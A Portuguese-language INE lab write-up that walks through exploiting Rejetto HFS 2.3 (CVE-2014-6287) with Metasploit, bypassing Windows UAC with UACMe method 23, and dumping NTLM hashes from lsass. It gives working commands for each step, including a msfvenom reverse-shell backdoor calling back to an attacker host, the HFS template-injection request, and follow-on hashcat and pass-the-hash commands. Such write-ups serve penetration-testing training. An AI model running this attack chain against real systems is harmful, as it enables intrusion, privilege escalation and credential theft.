# 🧪 Lab Report — HFS RCE + UAC Bypass (UACMe) + Hashdump

> **Plataforma:** INE
> **Tema central:** Exploração de Rejetto HFS 2.3 → Meterpreter → Bypass de UAC com UACMe → Escalação de privilégio → Hashdump
> **Alvo:** `demo.ine.local`

---

## 🎯 Objetivo

Explorar uma vulnerabilidade RCE no servidor HFS 2.3, obter shell como usuário administrador padrão, e usar o UACMe para contornar o UAC do Windows e obter privilégio elevado para executar hashdump.

---

## 🧠 Conceitos Centrais Deste Lab

**Dois conceitos distintos que precisam ser entendidos:**

| Conceito | O Que É | Por Que Importa |
|---------|---------|----------------|
| **Administrador vs Alto Privilégio** | Conta admin não significa processo elevado | UAC separa os dois |
| **UAC Bypass** | Contornar confirmação de elevação | Necessário para operações privilegiadas |

---

## 📋 Sumário de Etapas

| # | Ação | Ferramenta | Resultado |
|---|------|-----------|-----------|
| 1 | Port scan + versão | `nmap -sV` | HFS 2.3 na porta 80 |
| 2 | Buscar exploits | `searchsploit` | RCE confirmado |
| 3 | Explorar HFS | `rejetto_hfs_exec` | Meterpreter como admin |
| 4 | Migrar processo | `migrate explorer.exe` | Processo estável |
| 5 | Tentar getsystem | `getsystem` | ❌ Falha — UAC ativo |
| 6 | Gerar backdoor | `msfvenom` | `backdoor.exe` |
| 7 | Upload + UAC bypass | `UACMe Akagi64.exe` | ✅ Alto privilégio |
| 8 | Migrar para lsass | `migrate lsass.exe` | Acesso à memória LSASS |
| 9 | Dump de hashes | `hashdump` | Hash NTLM do admin |

---

## 🔬 Execução Passo a Passo

### Step 1 — Identificar o HFS

```bash
nmap demo.ine.local
nmap -sV -p 80 demo.ine.local
```

**Resultado:**
```
80/tcp  open  http  HttpFileServer httpd 2.3
Service Info: OS: Windows
```

**O que é o Rejetto HFS (HTTP File Server):**
Servidor HTTP simples para compartilhamento de arquivos em Windows. Muito usado por usuários domésticos e em ambientes corporativos pequenos. A versão 2.3 tem uma vulnerabilidade crítica de RCE via injeção de template na URL.

---

### Step 2 — Buscar Exploits com searchsploit

```bash
searchsploit hfs
```

**Output relevante:**
```
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution  | windows/remote/34926.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow            | multiple/remote/48569.py
```

**Por que usar searchsploit antes do Metasploit:**
`searchsploit` consulta o banco de dados local do Exploit-DB — mais rápido que pesquisa online e funciona sem internet. Mostra exploits públicos disponíveis para a versão identificada.

```bash
# Ver detalhes de um exploit específico
searchsploit -x windows/remote/34926.py

# Copiar para o diretório atual
searchsploit -m windows/remote/34926.py
```

---

### Step 3 — Explorar com Metasploit

```bash
msfconsole -q

use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
```

**Como o exploit funciona:**
O HFS 2.3 processa templates de macro em partes da URL. O parâmetro `search` não sanitiza a entrada corretamente — uma macro especialmente formatada executa comandos no servidor via `cmd.exe`.

```
Requisição maliciosa:
GET /?search=%00{.exec|COMANDO.} HTTP/1.1
        ↓
HFS processa o template
        ↓
cmd.exe executa COMANDO no contexto do HFS
        ↓
Payload Meterpreter baixado e executado
```

**Resultado:**
```
[*] Meterpreter session 1 opened

meterpreter >
```

---

### Step 4 — Verificar Usuário e Migrar Processo

```bash
meterpreter > getuid
# Server username: VICTIM\admin

meterpreter > sysinfo
# OS: Windows 2012 R2

# Encontrar PID do explorer.exe
meterpreter > ps -S explorer.exe
# 2332  explorer.exe  VICTIM\admin

meterpreter > migrate 2332
```

**Por que migrar para `explorer.exe`:**

| Situação | Motivo |
|---------|--------|
| Processo original (HFS) pode ser fechado | Mata a sessão |
| `explorer.exe` é estável | Roda enquanto o usuário estiver logado |
| Herda permissões do usuário atual | Mesmas permissões de `admin` |

---

### Step 5 — Tentativa de getsystem (Falha por UAC)

```bash
meterpreter > getsystem
# [-] priv_elevate_getsystem: Operation failed: Access is denied.
```

**Por que falha — O Modelo de UAC do Windows:**

```
Conta: admin (membro do grupo Administrators)
        ↓
Processos normais rodam com token PADRÃO (usuário comum)
        ↓
Operações privilegiadas precisam de token ELEVADO
        ↓
UAC exibe prompt "Deseja permitir..." para elevar
        ↓
getsystem tenta elevar sem passar pelo prompt
        ↓
❌ Falha — UAC bloqueia a elevação silenciosa
```

**Verificar que o usuário é admin mas sem elevação:**
```bash
meterpreter > shell
C:\> net localgroup administrators
# Membros: admin ← está no grupo

C:\> whoami /groups
# BUILTIN\Administrators  → Uso: Somente negação
#    ↑ "Somente negação" = token não elevado = UAC ativo
```

---

### Step 6 — Gerar Backdoor com msfvenom

```bash
# No terminal do Kali (fora do msfconsole)
msfvenom \
  -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.31.2 \
  LPORT=4444 \
  -f exe > /root/backdoor.exe

# Verificar
file backdoor.exe
# backdoor.exe: PE32 executable (GUI) Intel 80386, for MS Windows
```

**Por que gerar um novo executável:**
O UACMe precisa executar um programa que você controla com privilégio elevado. O `backdoor.exe` gerado pelo msfvenom é o payload que receberá a conexão com token elevado quando o UACMe fizer a elevação.

---

### Step 7 — Upload e UAC Bypass com UACMe

```bash
# No meterpreter — navegar para pasta Temp do usuário
meterpreter > cd C:\\Users\\admin\\AppData\\Local\\Temp

# Upload dos arquivos necessários
meterpreter > upload /root/Desktop/tools/UACME/Akagi64.exe .
meterpreter > upload /root/backdoor.exe .

meterpreter > ls
# Akagi64.exe
# backdoor.exe
```

**Em outro terminal — configurar listener:**
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.31.2
set LPORT 4444
exploit
```

**De volta ao meterpreter — executar UACMe:**
```bash
meterpreter > shell

C:\Users\admin\AppData\Local\Temp> Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

---

### Step 8 — O Que é UACMe e o Método 23

**UACMe** é uma ferramenta open-source que cataloga e implementa múltiplos métodos de bypass de UAC no Windows.

**Método 23 — IFileOperation (DLL Hijack):**

```
Autor: Leo Davidson (derivado)
Tipo: DLL Hijacking
Método: IFileOperation COM object
Alvo: \system32\pkgmgr.exe
Componente: DismCore.dll
Função: ucmDismMethod
```

**Como funciona:**
```
Akagi64.exe 23 C:\...\backdoor.exe
        ↓
UACMe usa IFileOperation (interface COM com auto-elevação)
para copiar uma DLL maliciosa para %windir%\system32
        ↓
pkgmgr.exe é executado (processo auto-elevado do Windows)
        ↓
pkgmgr.exe carrega DismCore.dll (nossa DLL maliciosa)
        ↓
DLL executa backdoor.exe com token ELEVADO
        ↓
backdoor.exe → Meterpreter → listener com HIGH INTEGRITY
```

**Resultado no listener:**
```
[*] Meterpreter session 2 opened

meterpreter > getuid
# Server username: VICTIM\admin

meterpreter > getsystem
# ...got system via technique 1 (Named Pipe Impersonation)

meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
```

---

### Step 9 — Migrar para lsass.exe e Hashdump

```bash
# Encontrar PID do lsass.exe
meterpreter > ps -S lsass.exe
# 496  lsass.exe  NT AUTHORITY\SYSTEM

meterpreter > migrate 496
```

**Por que migrar para `lsass.exe`:**
O `lsass.exe` (Local Security Authority Subsystem Service) é o processo que gerencia autenticação no Windows e **mantém credenciais na memória**. Migrar para ele garante:
- Acesso direto às estruturas de dados de credenciais
- `hashdump` funciona de forma mais confiável
- Mesmo contexto de segurança que o processo de autenticação

```bash
meterpreter > hashdump
```

**Resultado:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
admin:1012:aad3b435b51404eeaad3b435b51404ee:HASH_NTLM:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**Admin NTLM Hash (flag):** `4d6583ed4cef81c2f2ac3c88fc5f3da6`

---

## 📊 Resultado Final

| Informação | Valor |
|-----------|-------|
| Aplicação vulnerável | Rejetto HFS 2.3 |
| CVE | CVE-2014-6287 |
| Acesso inicial | `VICTIM\admin` (sem elevação) |
| Método de bypass UAC | UACMe método 23 (IFileOperation) |
| Acesso final | `NT AUTHORITY\SYSTEM` |
| Admin NTLM Hash | `4d6583ed4cef81c2f2ac3c88fc5f3da6` |

---

## 🧠 Conceitos Consolidados

### UAC — O Que Separa Admin de Alto Privilégio

```
Windows Vista+:
Usuário membro de Administrators
        ↓
Ao fazer login → dois tokens criados:
  Token padrão  → processos normais
  Token elevado → processos com "Executar como Administrador"

getsystem sem UAC bypass:
  Tenta elevar usando token padrão → UAC bloqueia

Com UAC bypass:
  Executa processo com token elevado sem prompt
  → getsystem funciona
  → NT AUTHORITY\SYSTEM alcançado
```

### Níveis de Integridade do Windows

| Nível | Processo | O Que Pode |
|-------|---------|-----------|
| Low | Browser sandbox | Mínimo |
| Medium | Processos normais do usuário | Acesso ao perfil |
| High | Processos elevados (admin com UAC aceito) | Sistema de arquivos, registro |
| System | SYSTEM, lsass | Tudo |

`getsystem` só funciona a partir de nível **High** ou superior.

### searchsploit — Referência Rápida

```bash
# Buscar por aplicação
searchsploit hfs
searchsploit "rejetto"
searchsploit "apache 2.4"

# Ver o exploit sem abrir editor
searchsploit -x windows/remote/34926.py

# Copiar para diretório atual
searchsploit -m windows/remote/34926.py

# Buscar por CVE
searchsploit CVE-2014-6287

# Atualizar banco de dados
searchsploit -u
```

---

## 🔁 Próximos Passos Lógicos

```
Hashes NTLM obtidos
        ↓
Quebrar offline
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
        ↓
Pass-the-Hash em outros sistemas da rede
crackmapexec smb SUBNET -u administrator -H 4d6583ed4cef81c2f2ac3c88fc5f3da6
        ↓
Persistência (opcional em lab)
use post/windows/manage/persistence
```

---

## 📌 Relacionados

- [[Pass-the-Hash — Ataque PtH]]
- [[Metasploit — Fundamentos e Arquitetura]]
- [[Top 10 Vulnerabilidades — Servicos Windows]]
- [[SMB Brute Force e PsExec Meterpreter]]
- [[EternalBlue — MS17-010 e WannaCry]]

#lab #exploração #windows #uac-bypass #ferramenta/metasploit #privilege-escalation
